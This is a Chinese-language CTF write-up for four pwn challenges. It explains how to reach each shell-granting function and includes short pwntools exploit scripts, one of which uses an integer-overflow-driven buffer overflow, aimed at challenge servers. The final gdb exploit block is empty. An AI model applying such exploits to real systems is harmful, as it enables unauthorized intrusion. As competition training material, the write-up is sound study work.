# Real Login
![[Pasted image 20240929115710.png]]
`fun`函数中可以看出输入的`v3`等于`password`时即可运行`win`函数获取`shell`
![[Pasted image 20240929115811.png]]
可以看到`password`的内容为'NewStar!!!'，输入获取`shell`
![[Pasted image 20240929115852.png]]

# Game
![[Pasted image 20240929115948.png]]
`game`函数中可以看出输入的`v0`在(0,10)的范围内即可
构造exp:
```python
# 一次跑不通就多跑几次
from pwn import *

# context(arch='amd64', os='linux', log_level='debug')
local = False
if local:
    p = process('./game')
else:
    p = remote('39.106.48.123', 26563)

v1 = 0

while v1 <= 999:
    p.recvuntil(b'num: ')
    p.sendline(b'10')
    v1 += 10
    print(v1)

print(v1)
p.interactive()
```
运行获取`shell`
![[Pasted image 20240929120213.png]]

# overwrite
![[Pasted image 20240929120552.png]]
当`v4`中的字符转为整数后大于114514时即可获取`shell`,正常输入时最大输入48个数，既0x30长度，刚好无法覆盖v4
![[Pasted image 20240929120941.png]]
![[Pasted image 20240929120950.png]]
我们可以发现v2的定义为有符号的整数，在read时会将v2转为无符号整数，此处有整数溢出，故可以输入一个负数，在read时即可read超出0x30数量的字符
exp:
```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')    
local = True
if local:
    p = process('./overwrite')
else:
    p = remote('8.147.132.32', 41160)

p.recvuntil(b'readin: ')
p.sendline(b'-1')
p.recvuntil(b'say: ')

payload = b'a' * 0x30
payload += b'114515'

p.sendline(payload)
p.interactive()
```
![[Pasted image 20240929121418.png]]

# gdb
![[Pasted image 20240929121602.png]]
题意为将``v10``的数据按某种规则加密，我们输入的字符与加密后的字符一致即可获取`shell`
在`gdb`中可以看到加密前的数据为`0d000721`
![[Pasted image 20240929121931.png]]![[Pasted image 20240929122007.png]]
数据加密后为`0x4557455355431d5d`,输入即可
exp:
```python

```